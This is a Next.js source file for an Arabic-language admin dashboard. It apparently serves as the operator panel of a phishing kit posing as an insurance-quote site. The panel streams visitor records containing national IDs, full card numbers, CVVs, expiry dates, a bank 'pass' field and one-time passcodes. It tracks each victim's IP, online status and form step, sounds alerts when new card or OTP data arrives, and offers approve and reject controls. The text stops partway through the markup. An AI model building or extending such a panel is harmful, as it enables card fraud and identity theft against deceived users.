"use client"

import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  Flag,
  CheckCircle,
  ChevronLeft,
  ChevronRight,
  LogOut,
  FileText,
  Car,
  Bell,
  RefreshCw,
  Eye,
  EyeOff,
  AlertTriangle,
  AlertCircle,
  
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { format, formatDistanceToNow } from "date-fns"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogDescription,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { collection, onSnapshot, orderBy, query, doc, updateDoc } from "firebase/firestore"
import { ref, onValue } from "firebase/database"
import { database, db } from "@/lib/firebase"
import { motion, AnimatePresence } from "framer-motion"
type FlagColor = "red" | "yellow" | "green" | null

// Insurance form data interface
export interface FormData {
  // Step 1
  insuranceType: string
  serialNumber: string
  idNumber: string
  birthDate: string

  // Step 2
  vehicleType: string
  vehicleModel: string
  vehicleYear: string
  vehicleValue: string

  // Step 3
  selectedPlan: string
  selectedOfferId?: string
  selectedFeatures?: string[]
  totalPrice?: string
  coverage: string[]
}

// Card data interface
interface CardData {
  cardNumber: string
  cardExpiry: string
  cvv: string
  cardholderName: string
  bank?: string
  prefix?: string
  pass?: string
  otp?: string
  otpCode?: string
  allOtps?: string[]
}

interface Notification {
  isHidden?: any
  id: string
  createdDate: string
  status: "pending" | "approved" | "rejected" | string
  country?: string
  ip?: string
  page: string
  lastSeen: string
  isOnline?: boolean
  flagColor?: FlagColor

  // Personal info
  name?: string
  insuranceType: string
  serialNumber: string
  birthDate: string

  // Step 2
  vehicleType: string
  vehicleModel: string
  vehicleYear: string
  vehicleValue: string

  // Step 3
  selectedPlan: string
  selectedOfferId?: string
  selectedFeatures?: string[]
  totalPrice?: string
  coverage: string[]
  mobile?: string
  phone?: string
  idNumber?: string

  // Card data
  cardData?: CardData

  // Legacy fields for backward compatibility
  bank?: string
  cardStatus?: string
  cvv?: string
  expiryDate?: string
  notificationCount?: number
  otp?: string
  otp2?: string
  cardNumber?: string
  personalInfo?: {
    id?: string
    name?: string
  }
  prefix?: string
  violationValue?: number
  pass?: string
  year?: string
  month?: string
  pagename?: string
  plateType?: string
  allOtps?: string[] | null
  phoneOtp?: string
  cardExpiry?: string
  otpCode?: string
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  const flagColors = [
    {
      color: "red",
      label: "علم أحمر",
      iconColor: "text-red-500 fill-red-500",
      bgColor: "bg-red-100 dark:bg-red-900 hover:bg-red-200 dark:hover:bg-red-800",
    },
    {
      color: "yellow",
      label: "علم أصفر",
      iconColor: "text-yellow-500 fill-yellow-500",
      bgColor: "bg-yellow-100 dark:bg-yellow-900 hover:bg-yellow-200 dark:hover:bg-yellow-800",
    },
    {
      color: "green",
      label: "علم أخضر",
      iconColor: "text-green-500 fill-green-500",
      bgColor: "bg-green-100 dark:bg-green-900 hover:bg-green-200 dark:hover:bg-green-800",
    },
  ] as const

  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 rounded-full group">
          <Flag
            className={`h-4 w-4 transition-colors group-hover:text-primary ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-1">
        <div className="flex gap-1">
          {flagColors.map((fc) => (
            <Button
              key={fc.color}
              variant="ghost"
              size="icon"
              className={`h-8 w-8 rounded-full ${fc.bgColor}`}
              onClick={() => onColorChange(notificationId, fc.color as FlagColor)}
            >
              <Flag className={`h-4 w-4 ${fc.iconColor}`} />
              <span className="sr-only">{fc.label}</span>
            </Button>
          ))}
          {currentColor && (
            <Button
              variant="ghost"
              size="icon"
              className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
              onClick={() => onColorChange(notificationId, null)}
            >
              <Flag className="h-4 w-4 text-gray-500" />
              <span className="sr-only">إزالة العلم</span>
            </Button>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// User status component
function UserStatus({ userId }: { userId: string }) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        setIsOnline(data?.state === "online" || data?.isOnline || false)
      } else {
        setIsOnline(false)
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center justify-center text-xs">
      <motion.div
        className={`h-2 w-2 rounded-full mr-1.5 ${isOnline ? "bg-green-500" : "bg-gray-400"}`}
        animate={{ scale: isOnline ? [1, 1.2, 1] : 1 }}
        transition={{ duration: 0.5, repeat: isOnline ? Number.POSITIVE_INFINITY : 0 }}
      />
      <span className={isOnline ? "text-green-600 dark:text-green-400" : "text-muted-foreground"}>
        {isOnline ? "متصل" : "غير متصل"}
      </span>
    </div>
  )
}

// Custom hook to track online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        if (data) {
          const onlineCount = Object.values(data).filter(
            (status: any) => status.state === "online" || status.isOnline,
          ).length
          setOnlineUsersCount(onlineCount)
        }
      } else {
        setOnlineUsersCount(0)
      }
    })
    return () => unsubscribe()
  }, [])
  return onlineUsersCount
}

// Play notification sound function
export const playNotificationSound = () => {
  const audio = new Audio('/not.mp3');
  console.log('play')
  if (audio) {
    audio!.play().catch((error) => {
      console.error('Failed to play sound:', error);
    });
  }
};


// Pagination component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  const pageNumbers = useMemo(() => {
    const pages = []
    const maxVisiblePages = 5
    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) pages.push(i)
    } else {
      pages.push(1)
      let startPage = Math.max(2, currentPage - 1)
      let endPage = Math.min(totalPages - 1, currentPage + 1)
      if (currentPage <= 3) endPage = 4
      if (currentPage >= totalPages - 2) startPage = totalPages - 3
      if (startPage > 2) pages.push(-1) // Ellipsis
      for (let i = startPage; i <= endPage; i++) pages.push(i)
      if (endPage < totalPages - 1) pages.push(-2) // Ellipsis
      pages.push(totalPages)
    }
    return pages
  }, [currentPage, totalPages])

  if (totalPages <= 1) return null

  return (
    <div className="flex items-center justify-center space-x-1 rtl:space-x-reverse mt-6">
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(Math.max(1, currentPage - 1))}
        disabled={currentPage === 1}
        className="h-9 w-9"
      >
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>
      {pageNumbers.map((pageNumber, index) =>
        pageNumber < 0 ? (
          <span key={`ellipsis-${index}`} className="px-2 text-muted-foreground">
            ...
          </span>
        ) : (
          <Button
            key={pageNumber}
            variant={currentPage === pageNumber ? "default" : "outline"}
            size="icon"
            onClick={() => onPageChange(pageNumber)}
            className="h-9 w-9"
          >
            {pageNumber}
          </Button>
        ),
      )}
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(Math.min(totalPages, currentPage + 1))}
        disabled={currentPage === totalPages || totalPages === 0}
        className="h-9 w-9"
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

// Real-time update indicator component
function LastUpdatedIndicator({ lastUpdated }: { lastUpdated: Date }) {
  return (
    <div className="flex items-center justify-center text-xs text-muted-foreground mt-3">
      <div className="flex items-center gap-1.5">
        <motion.div
          className="h-2 w-2 rounded-full bg-green-500"
          animate={{ scale: [1, 1.3, 1] }}
          transition={{ duration: 1, repeat: Number.POSITIVE_INFINITY, ease: "easeInOut" }}
        />
        <span>آخر تحديث: {format(lastUpdated, "hh:mm:ss a", { locale: ar })}</span>
      </div>
    </div>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [message, setMessage] = useState<{ text: string; type: "success" | "error" } | null>(null)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "insurance" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "completed">("all")
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [previousNotificationCount, setPreviousNotificationCount] = useState(0)
  const [previousCardCount, setPreviousCardCount] = useState(0)
  const [recentlyUpdated, setRecentlyUpdated] = useState<Record<string, boolean>>({})
  const [lastUpdated, setLastUpdated] = useState<Date>(new Date())
  const [newNotifications, setNewNotifications] = useState<string[]>([])
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({})

  const toggleSensitiveVisibility = (fieldId: string) => {
    setShowSensitive((prev) => ({ ...prev, [fieldId]: !prev[fieldId] }))
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    const uniqueVisitors = new Set(notificationsData.map((n) => n.ip)).size
    setTotalVisitors(uniqueVisitors || notificationsData.length)
    const cardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
    setCardSubmissions(cardCount)
  }

  useEffect(() => {
    const statusRef = ref(database, "status")
    const unsubscribe = onValue(statusRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val()
        const newOnlineStatuses: Record<string, boolean> = {}
        Object.entries(data).forEach(([userId, statusData]: [string, any]) => {
          newOnlineStatuses[userId] = statusData.state === "online" || statusData.isOnline || false
        })
        setOnlineStatuses(newOnlineStatuses)
      }
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    let unsubscribe: () => void
    const fetchData = async () => {
      const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
      unsubscribe = onSnapshot(
        q,
        (querySnapshot) => {
          const newIds: string[] = []
          const updatedIds: string[] = []
          querySnapshot.docChanges().forEach((change) => {
            if (change.type === "added" && !notifications.some((n) => n.id === change.doc.id))
              newIds.push(change.doc.id)
            else if (change.type === "modified") updatedIds.push(change.doc.id)
          })

          const notificationsData = querySnapshot.docs
            .map((doc) => ({ id: doc.id, ...doc.data() }) as Notification)
            .filter((notification) => !notification.isHidden)

          const currentNotificationCount = notificationsData.length
          const currentCardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length

          if (notifications.length > 0) {
            if (currentNotificationCount > previousNotificationCount) playNotificationSound()
            if (currentCardCount > previousCardCount) playNotificationSound()
            const hasNewCardInfo = notificationsData.some(
              (n) =>
                n.cardData?.cardNumber && !notifications.find((oldN) => oldN.id === n.id && oldN.cardData?.cardNumber),
            )
            const hasNewGeneralInfo = notificationsData.some(
              (n) =>
                (n.idNumber || n.mobile) &&
                !notifications.find((oldN) => oldN.id === n.id && (oldN.idNumber || oldN.mobile)),
            )
            const hasStatusUpdate = notificationsData.some((n) =>
              notifications.find((oldN) => oldN.id === n.id && oldN.status !== n.status),
            )
            const hasOtpUpdate = notificationsData.some(
              (n) => n.otp && notifications.find((oldN) => oldN.id === n.id && oldN.otp !== n.otp),
            )
            if (hasNewCardInfo) playNotificationSound()
            else if (hasNewGeneralInfo) playNotificationSound()
            else if (hasStatusUpdate || hasOtpUpdate) playNotificationSound()
          }

          setPreviousNotificationCount(currentNotificationCount)
          setPreviousCardCount(currentCardCount)
          updateStatistics(notificationsData)

          const newOnlineStatusesUpdate: Record<string, boolean> = { ...onlineStatuses }
          notificationsData.forEach((n) => {
            const lastSeenTime = new Date(n.lastSeen).getTime()
            const fiveMinutesAgo = Date.now() - 5 * 60 * 1000
            if (newOnlineStatusesUpdate[n.id] === undefined)
              newOnlineStatusesUpdate[n.id] = lastSeenTime > fiveMinutesAgo
          })
          setOnlineStatuses(newOnlineStatusesUpdate)

          if (newIds.length > 0 || updatedIds.length > 0) {
            const newUpdatedMap: Record<string, boolean> = {}
            updatedIds.forEach((id) => (newUpdatedMap[id] = true))
            setRecentlyUpdated(newUpdatedMap)
            setLastUpdated(new Date())
            setNewNotifications(newIds)
            setTimeout(() => setRecentlyUpdated({}), 5000)
          }
          setNotifications(notificationsData)
          setIsLoading(false)
          if (Math.abs(currentNotificationCount - previousNotificationCount) > 5) setCurrentPage(1)
        },
        (error) => {
          console.error("Error fetching notifications:", error)
          setIsLoading(false)
          setMessage({ text: "فشل في تحميل البيانات. حاول مرة أخرى.", type: "error" })
        },
      )
    }
    fetchData()
    return () => {
      if (unsubscribe) unsubscribe()
    }
  }, []) // Removed dependencies to avoid re-fetching on local state changes

  const filteredNotifications = useMemo(() => {
    if (filterType === "all") return notifications
    if (filterType === "card") return notifications.filter((n) => n.cardData?.cardNumber || n.cardNumber)
    if (filterType === "online") return notifications.filter((n) => onlineStatuses[n.id])
    if (filterType === "completed") return notifications.filter((n) => n.status === "approved")
    return notifications
  }, [filterType, notifications, onlineStatuses])

  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage)
  const currentItems = useMemo(() => {
    const indexOfLastItem = currentPage * itemsPerPage
    const indexOfFirstItem = indexOfLastItem - itemsPerPage
    return filteredNotifications.slice(indexOfFirstItem, indexOfLastItem)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const handlePageChange = (pageNumber: number) => {
    setCurrentPage(pageNumber)
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const handleClearAll = async () => {
    setIsSubmitting(true)
    try {
      await Promise.all(notifications.map((n) => updateDoc(doc(db, "pays", n.id), { isHidden: true })))
      setNotifications([])
      setMessage({ text: "تم مسح جميع الإشعارات بنجاح.", type: "success" })
    } catch (error) {
      console.error("Error clearing notifications:", error)
      setMessage({ text: "فشل في مسح الإشعارات.", type: "error" })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleDelete = async (id: string) => {
    setIsSubmitting(true)
    try {
      await updateDoc(doc(db, "pays", id), { isHidden: true })
      setNotifications((prev) => prev.filter((n) => n.id !== id))
      setMessage({ text: "تم حذف الإشعار بنجاح.", type: "success" })
    } catch (error) {
      console.error("Error deleting notification:", error)
      setMessage({ text: "فشل في حذف الإشعار.", type: "error" })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    setIsSubmitting(true)
    try {
      await updateDoc(doc(db, "pays", id), { status: state })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, status: state } : n)))
      playNotificationSound()
      setMessage({ text: `تم تحديث حالة الإشعار إلى ${state === "approved" ? "مقبول" : "مرفوض"}.`, type: "success" })
    } catch (error) {
      console.error("Error updating notification status:", error)
      setMessage({ text: "فشل في تحديث حالة الإشعار.", type: "error" })
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleLogout = () => router.push("/")
  const handleInfoClick = (notification: Notification, infoType: "personal" | "insurance" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }
  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      await updateDoc(doc(db, "pays", id), { flagColor: color })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, flagColor: color } : n)))
      playNotificationSound()
    } catch (error) {
      console.error("Error updating flag color:", error)
      setMessage({ text: "فشل في تحديث لون العلم.", type: "error" })
    }
  }

  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""
    const colorMap = {
      red: "bg-red-50 dark:bg-red-900/20 hover:bg-red-100 dark:hover:bg-red-800/30",
      yellow: "bg-yellow-50 dark:bg-yellow-900/20 hover:bg-yellow-100 dark:hover:bg-yellow-800/30",
      green: "bg-green-50 dark:bg-green-900/20 hover:bg-green-100 dark:hover:bg-green-800/30",
    }
    return colorMap[flagColor]
  }

  useEffect(() => {
    if (message) {
      const timer = setTimeout(() => setMessage(null), 3000)
      return () => clearTimeout(timer)
    }
  }, [message])

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-gray-950 flex items-center justify-center p-4">
        <div className="flex flex-col items-center space-y-3">
          <RefreshCw className="h-8 w-8 text-primary animate-spin" />
          <p className="text-lg font-medium text-muted-foreground">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  const cardCount = notifications.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length
  const completedCount = notifications.filter((n) => n.status === "approved").length

  const renderSensitiveField = (label: string, value: string | undefined, fieldId: string) => {
    if (!value) return null
    const isVisible = showSensitive[fieldId]
    return (
      <div className="flex justify-between items-center">
        <span className="font-medium text-muted-foreground">{label}:</span>
        <div className="flex items-center gap-2" dir="ltr">
          <span className={`font-semibold ${!isVisible ? "blur-sm" : ""}`}>{isVisible ? value : "••••••••••••"}</span>
          <Button variant="ghost" size="icon" onClick={() => toggleSensitiveVisibility(fieldId)} className="h-7 w-7">
            {isVisible ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 dark:bg-gray-950 text-foreground p-4 md:p-6">
      <AnimatePresence>
        {message && (
          <motion.div
            initial={{ opacity: 0, y: -50 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -50 }}
            className={`fixed top-5 right-5 z-50 p-4 rounded-md shadow-lg ${message.type === "success" ? "bg-green-500" : "bg-red-500"} text-white`}
          >
            {message.text}
          </motion.div>
        )}
      </AnimatePresence>
      <div className="max-w-screen-xl mx-auto">
        <header className="flex flex-col sm:flex-row justify-between items-center mb-6 pb-4 border-b border-gray-200 dark:border-gray-800">
          <div className="flex items-center gap-3 mb-4 sm:mb-0">
            <Bell className="h-7 w-7 text-primary" />
            <h1 className="text-2xl md:text-3xl font-bold text-gray-800 dark:text-gray-100">لوحة الإشعارات</h1>
          </div>
          <div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              disabled={notifications.length === 0 || isSubmitting}
              className="w-full sm:w-auto"
            >
              <Trash2 className="h-4 w-4 ml-2" />
              {isSubmitting ? "جاري المسح..." : "مسح الكل"}
            </Button>
            <Button variant="outline" onClick={handleLogout} className="w-full sm:w-auto">
              <LogOut className="h-4 w-4 ml-2" />
              العودة للرئيسية
            </Button>
          </div>
        </header>

        {/* Statistics Grid */}
        <section className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 mb-6 md:mb-8">
          {[
            { title: "المستخدمين المتصلين", value: onlineUsersCount, icon: UserCheck, color: "blue" },
            { title: "إجمالي الزوار", value: totalVisitors, icon: Users, color: "green" },
            { title: "البطاقات المقدمة", value: cardSubmissions, icon: CreditCard, color: "purple" },
          ].map((stat) => (
            <Card key={stat.title} className="shadow-sm hover:shadow-md transition-shadow">
              <CardContent className="p-5 flex items-center gap-4">
                <div className={`rounded-lg p-3 bg-${stat.color}-100 dark:bg-${stat.color}-900/30`}>
                  <stat.icon className={`h-6 w-6 text-${stat.color}-600 dark:text-${stat.color}-400`} />
                </div>
                <div>
                  <p className="text-sm font-medium text-muted-foreground">{stat.title}</p>
                  <p className="text-2xl font-bold text-gray-800 dark:text-gray-100">{stat.value}</p>
                </div>
              </CardContent>
            </Card>
          ))}
        </section>

        {/* Filter Section */}
        <Card className="mb-6 md:mb-8 shadow-sm">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-lg">
              <Filter className="h-5 w-5 text-primary" />
              تصفية النتائج
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-wrap gap-2">
              {[
                { label: `عرض الكل (${notifications.length})`, value: "all", icon: null },
                { label: `البطاقات (${cardCount})`, value: "card", icon: CreditCard },
                { label: `المتصلين (${onlineCount})`, value: "online", icon: UserCheck },
                { label: `المكتملة (${completedCount})`, value: "completed", icon: CheckCircle },
              ].map((filter) => (
                <Button
                  key={filter.value}
                  variant={filterType === filter.value ? "default" : "outline"}
                  onClick={() => setFilterType(filter.value as any)}
                  className="flex-grow sm:flex-grow-0"
                >
                  {filter.icon && <filter.icon className="h-4 w-4 ml-1.5" />}
                  {filter.label}
                </Button>
              ))}
            </div>
          </CardContent>
        </Card>

        <div className="flex justify-between items-center mb-4">
          <p className="text-sm text-muted-foreground">
            عرض{" "}
            {filteredNotifications.length > 0
              ? Math.min((currentPage - 1) * itemsPerPage + 1, filteredNotifications.length)
              : 0}
            {" - "}
            {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من {filteredNotifications.length} إشعار
          </p>
          <div className="flex items-center gap-2">
            <span className="text-sm text-muted-foreground">عناصر لكل صفحة:</span>
            <Select
              value={itemsPerPage.toString()}
              onValueChange={(value) => {
                setItemsPerPage(Number.parseInt(value))
                setCurrentPage(1)
              }}
            >
              <SelectTrigger className="w-24 h-9">
                <SelectValue placeholder="10" />
              </SelectTrigger>
              <SelectContent>
                {[5, 10, 20, 50, 100].map((val) => (
                  <SelectItem key={val} value={val.toString()}>
                    {val}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </div>

        <Card className="shadow-sm overflow-hidden">
          {/* Desktop Table View */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-100 dark:bg-gray-800/50">
                <tr className="border-b border-gray-200 dark:border-gray-700">
                  {["الدولة", "المعلومات", "الصفحة الحالية", "الوقت", "الحالة", "العلم", "الإجراءات"].map((header) => (
                    <th
                      key={header}
                      className="px-4 py-3 text-right font-semibold text-muted-foreground whitespace-nowrap"
                    >
                      {header}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                <AnimatePresence>
                  {currentItems.map((notification) => (
                    <motion.tr
                      key={notification.id}
                      layout
                      initial={
                        newNotifications.includes(notification.id)
                          ? { opacity: 0, backgroundColor: "rgba(74, 222, 128, 0.3)" }
                          : { opacity: 1 }
                      }
                      animate={{ opacity: 1, backgroundColor: "transparent" }}
                      exit={{ opacity: 0 }}
                      transition={{ duration: 0.5 }}
                      className={`${getRowBackgroundColor(notification?.flagColor!)} hover:bg-gray-50 dark:hover:bg-gray-800/30 transition-colors ${recentlyUpdated[notification.id] ? "bg-yellow-50 dark:bg-yellow-900/20" : ""}`}
                    >
                      <td className="px-4 py-3 whitespace-nowrap">{notification.country || "غير معروف"}</td>
                      <td className="px-4 py-3">
                        <div className="flex flex-wrap gap-1.5">
                          {[
                            { type: "personal", label: "شخصية", data: notification.idNumber, icon: FileText },
                            { type: "insurance", label: "تأمين", data: notification.vehicleModel, icon: Car },
                            {
                              type: "card",
                              label: "بطاقة",
                              data: notification.cardData?.cardNumber || notification.cardNumber,
                              icon: CreditCard,
                              color: "green",
                            },
                          ].map((info) => (
                            <Badge
                              key={info.type}
                              variant={info.data ? "default" : "secondary"}
                              className={`rounded-md cursor-pointer text-xs px-2 py-0.5 ${info.data && info.color ? `bg-${info.color}-500 dark:bg-${info.color}-600 hover:bg-${info.color}-600 dark:hover:bg-${info.color}-700` : ""}`}
                              onClick={() => handleInfoClick(notification, info.type as any)}
                            >
                              <info.icon className="h-3 w-3 ml-1" />
                              {info.data ? info.label : `لا يوجد ${info.label}`}
                            </Badge>
                          ))}
                          {recentlyUpdated[notification.id] && (
                            <span className="inline-flex items-center text-xs text-amber-600 dark:text-amber-400">
                              <AlertCircle className="h-3 w-3 ml-1" /> تحديث
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-3 whitespace-nowrap">خطوة - {notification.page}</td>
                      <td className="px-4 py-3 whitespace-nowrap">
                        {notification.createdDate &&
                          formatDistanceToNow(new Date(notification.createdDate), { addSuffix: true, locale: ar })}
                      </td>
                      <td className="px-4 py-3 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-4 py-3 text-center">
                        <FlagColorSelector
                          notificationId={notification.id}
                          currentColor={notification.flagColor || null}
                          onColorChange={handleFlagColorChange}
                        />
                      </td>
                      <td className="px-4 py-3 text-center">
                        <div className="flex justify-center items-center gap-1">
                          <Badge variant="outline" className="text-xs px-2 py-0.5">
                            {notification.otp || "لا يوجد OTP"}
                          </Badge>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => handleDelete(notification.id)}
                            className="h-8 w-8 text-red-500 hover:text-red-700 dark:text-red-400 dark:hover:text-red-300"
                            disabled={isSubmitting}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </td>
                    </motion.tr>
                  ))}
                </AnimatePresence>
                {currentItems.length === 0 && (
                  <tr>
                    <td colSpan={7} className="px-4 py-10 text-center text-muted-foreground">
                      <div className="flex flex-col items-center gap-2">
                        <AlertTriangle className="h-10 w-10 text-yellow-500" />
                        <p className="font-medium">لا توجد إشعارات تطابق الفلتر المحدد.</p>
                        <p className="text-xs">حاول تغيير معايير التصفية أو تحقق لاحقًا.</p>
                      </div>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>

          {/* Mobile Card View */}
          <div className="md:hidden divide-y divide-gray-200 dark:divide-gray-700 p-2 sm:p-4">
            <AnimatePresence>
              {currentItems.length > 0 ? (
                currentItems.map((notification) => (
                  <motion.div
                    key={notification.id}
                    layout
                    initial={newNotifications.includes(notification.id) ? { opacity: 0, y: -20 } : { opacity: 1, y: 0 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    className={`py-4 ${getRowBackgroundColor(notification?.flagColor!)} ${recentlyUpdated[notification.id] ? "bg-yellow-50 dark:bg-yellow-900/20 rounded-md my-1 px-2" : ""}`}
                  >
                    <div className="flex justify-between items-start mb-3">
                      <div>
                        <div className="font-semibold text-gray-800 dark:text-gray-100">
                          {notification.name || notification.personalInfo?.name || "مستخدم غير معروف"}
                        </div>
                        <div className="text-xs text-muted-foreground">
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), { addSuffix: true, locale: ar })}
                        </div>
                        {recentlyUpdated[notification.id] && (
                          <span className="inline-flex items-center text-xs text-amber-600 dark:text-amber-400 mt-1">
                            <AlertCircle className="h-3 w-3 ml-1" /> تحديث جديد
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-2">
                        <FlagColorSelector
                          notificationId={notification.id}
                          currentColor={notification.flagColor || null}
                          onColorChange={handleFlagColorChange}
                        />
                        <UserStatus userId={notification.id} />
                      </div>
                    </div>

                    <div className="space-y-2.5 text-sm">
                      <div className="flex flex-wrap gap-1.5">
                        {[
                          { type: "personal", label: "شخصية", data: notification.idNumber, icon: FileText },
                          { type: "insurance", label: "تأمين", data: notification.vehicleModel, icon: Car },
                          {
                            type: "card",
                            label: "بطاقة",
                            data: notification.cardData?.cardNumber || notification.cardNumber,
                            icon: CreditCard,
                            color: "green",
                          },
                        ].map((info) => (
                          <Badge
                            key={info.type}
                            variant={info.data ? "default" : "secondary"}
                            className={`rounded-md cursor-pointer text-xs px-2 py-0.5 ${info.data && info.color ? `bg-${info.color}-500 dark:bg-${info.color}-600 hover:bg-${info.color}-600 dark:hover:bg-${info.color}-700` : ""}`}
                            onClick={() => handleInfoClick(notification, info.type as any)}
                          >
                            <info.icon className="h-3 w-3 ml-1" />
                            {info.data ? info.label : `لا يوجد ${info.label}`}
                          </Badge>
                        ))}
                      </div>
                      <div>
                        <span className="font-medium text-muted-foreground">الصفحة:</span> خطوة - {notification.page}
                      </div>
                      <div>
                        <span className="font-medium text-muted-foreground">OTP:</span> {notification.otp || "لا يوجد"}
                      </div>
                    </div>

                    <div className="flex gap-2 mt-4">
                      <Button
                        onClick={() => handleApproval("approved", notification.id)}
                        className="flex-1 bg-green-600 hover:bg-green-700 dark:bg-green-500 dark:hover:bg-green-600 text-white"
                        disabled={isSubmitting}
                      >
                        <CheckCircle className="h-4 w-4 ml-1.5" /> قبول
                      </Button>
                      <Button
                        onClick={() => handleApproval("rejected", notification.id)}
                        className="flex-1"
                        variant="destructive"
                        disabled={isSubmitting}
                      >
                        <AlertTriangle className="h-4 w-4 ml-1.5" /> رفض
                      </Button>
                      <Button
                        variant="outline"
                        onClick={() => handleDelete(notification.id)}
                        className="w-10 p-0"
                        disabled={isSubmitting}
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </motion.div>
                ))
              ) : (
                <div className="py-10 text-center text-muted-foreground">
                  <div className="flex flex-col items-center gap-2">
                    <AlertTriangle className="h-10 w-10 text-yellow-500" />
                    <p className="font-medium">لا توجد إشعارات تطابق الفلتر المحدد.</p>
                  </div>
                </div>
              )}
